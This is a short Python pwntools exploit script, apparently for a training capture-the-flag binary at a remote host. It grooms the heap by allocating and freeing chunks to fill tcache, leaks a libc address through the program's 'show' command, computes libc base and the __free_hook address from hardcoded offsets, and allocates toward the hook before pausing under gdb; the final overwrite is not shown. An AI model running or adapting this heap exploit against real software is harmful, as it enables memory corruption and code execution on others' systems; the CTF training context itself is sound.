import time
from pwn import *
import sys


SIZE=90

if "REMOTE" not in args:
	r= process('./test')
else:
	r = remote("bin.training.jinblack.it", 10101)



def malloc(size):
	r.recvuntil(b"> ")
	r.sendline(b"malloc %d" % size)
	r.recvuntil(b"> ")
	return r.recvuntil(b"\n")[:-1]

def free(address):
	r.recvuntil(b"> ")
	r.sendline(b"free %d" % address)
	r.recvuntil(b"> ")

def show(pointer,size):
	r.recvuntil(b"> ")
	r.sendline(b"show %d 20" % pointer)
	leak=(r.recv(32)[18:])
	return leak

##leak damn libc
first=int((malloc(0x100).decode("utf-8")),16)
second=int((malloc(0x100).decode("utf-8")),16)
third=int((malloc(0x100).decode("utf-8")),16)
fourth=int((malloc(0x100).decode("utf-8")),16)
fifth=int((malloc(0x100).decode("utf-8")),16)
sixth=int((malloc(0x100).decode("utf-8")),16)
seventh=int((malloc(0x100).decode("utf-8")),16)
notcache=int((malloc(0x100).decode("utf-8")),16)


free(notcache)
free(second)
free(third)
free(fourth)
free(fifth)
free(sixth)
free(seventh)
free(first)


leak=int(show(first,20).decode("utf-8"),16)
libc=leak-0x3ebca0
hook=libc+0x3ed8e8
print("[!] LEAK: "+ hex(leak))
print("[!] LIBC: "+ hex(libc))
print("[!] FREE HOOK: "+ hex(hook))
heap=int((malloc(1).decode("utf-8")),16)

diff=hook-heap
dog=int((malloc(diff/8).decode("utf-8")),16)

print(hex(dog))
gdb.attach(r)
input('wait')


r.interactive()

